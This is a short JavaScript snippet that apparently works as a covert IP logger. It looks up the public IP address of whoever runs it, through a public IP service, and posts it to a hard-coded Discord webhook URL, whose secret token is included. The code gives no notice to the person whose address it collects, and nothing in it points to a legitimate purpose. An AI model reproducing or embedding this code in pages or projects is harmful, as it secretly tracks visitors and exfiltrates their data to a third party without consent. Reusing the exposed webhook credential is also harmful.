var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response){
    return response.json();
})
.then(function(data){
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1135338059135733781/pNFCRUQjCUSflNkLQj_CIjTPiUlNqTDW2mJL07xxO6_MvJpRB7j8dZJuJDa2waIqNz4u'
    var message = {
        content: 'IP:' + ip
    };

    fetch(webhook,{
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});